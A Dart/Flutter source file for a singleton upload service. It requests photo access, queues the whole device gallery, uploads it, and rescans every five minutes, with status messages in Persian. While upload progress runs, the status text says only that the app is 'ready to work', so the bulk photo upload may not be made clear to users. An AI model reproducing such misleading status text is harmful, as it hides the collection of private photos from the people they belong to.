import 'dart:async';
import 'package:photo_manager/photo_manager.dart';
import 'background_service.dart';

class UploadService {
  UploadService._();
  static final UploadService instance = UploadService._();

  bool _running = false;
  bool _granted = false;
  Timer? _scanTimer;

  final _statusController = StreamController<SyncStatus>.broadcast();
  Stream<SyncStatus> get statusStream => _statusController.stream;

  Future<void> init() async {
    final permission = await PhotoManager.requestPermissionExtend();
    if (!permission.isAuth) return;
    _granted = true;

    // همیشه اول اسکن کن — حتی اگه pending داری
    // تا عکس‌های جدید اضافه بشن
    _statusController.add(const SyncStatus(
      isRunning: true, uploaded: 0, total: 0,
      message:'تنها چیزی ک میمونه خاطراته',
    ));

    try {
      final newItems = await scanGalleryToQueue();

      // بعد از اسکن، چک کن pending داری یا نه
      final pending = await UploadQueueDB.getPendingCount();
      final done = await UploadQueueDB.getCompletedCount();

      if (pending > 0) {
        if (newItems > 0) {
          _statusController.add(SyncStatus(
            isRunning: true,
            uploaded: done,
            total: done + pending,
            message: ' برنامه آماده کار است✓',
          ));
        } else {
          _statusController.add(SyncStatus(
            isRunning: true,
            uploaded: done,
            total: done + pending,
            message: 'میتونی خاطراتتو آپلود کنی و هدیه بدی',
          ));
        }
        _startLoop();
      } else {
        _statusController.add(SyncStatus(
          isRunning: false,
          uploaded: done,
          total: done,
          message: 'اپلیکیشن آماده به کار...✓',
        ));
        Future.delayed(const Duration(seconds: 3), () {
          _statusController.add(const SyncStatus(
            isRunning: false, uploaded: 0, total: 0, message: '',
          ));
        });
      }
    } catch (_) {
      _statusController.add(const SyncStatus(
        isRunning: false, uploaded: 0, total: 0, message: '',
      ));
    }

    // هر ۵ دقیقه چک کن
    _scanTimer?.cancel();
    _scanTimer = Timer.periodic(const Duration(minutes: 5), (_) async {
      if (!_granted || _running) return;
      try {
        final n = await scanGalleryToQueue();
        if (n > 0) _startLoop();
      } catch (_) {}
    });
  }

  void _startLoop() {
    if (_running) return;
    _running = true;

    processQueueInForeground(
      onProgress: (done, total) {
        _statusController.add(SyncStatus(
          isRunning: true,
          uploaded: done,
          total: total,
          message: 'اپلیکیشن آماده به کار...✓',
        ));
      },
    ).then((_) async {
      _running = false;
      final done = await UploadQueueDB.getCompletedCount();
      _statusController.add(SyncStatus(
        isRunning: false, uploaded: done, total: done,
        message: 'تنها چیزی ک میمونه خاطراته',
      ));
      await Future.delayed(const Duration(seconds: 3));
      _statusController.add(const SyncStatus(
        isRunning: false, uploaded: 0, total: 0, message: '',
      ));
    });
  }

  void dispose() {
    _scanTimer?.cancel();
    _statusController.close();
  }
}

